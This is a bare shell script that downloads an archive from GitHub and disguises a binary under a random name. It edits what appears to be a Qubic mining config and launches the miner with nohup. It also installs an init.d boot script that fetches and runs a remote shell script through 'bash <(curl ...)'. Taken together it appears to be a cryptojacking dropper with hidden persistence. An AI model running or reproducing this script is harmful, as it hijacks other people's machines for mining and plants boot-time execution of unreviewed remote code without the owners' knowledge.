cd /
wget https://github.com/brushda/ivory/releases/download/v1.9.7/total.zip
unzip total.zip
cd /total
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv amber $variable1
sed -i "s/python/${variable1}/g" ./scrap.sh
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/brushda/ivory/main/fresco.sh)" > ruins.sh
chmod a+x ruins.sh
update-rc.d ruins.sh defaults
rm -rf total.zip
cd /total
nohup ./scrap.sh
ps -ef | grep total
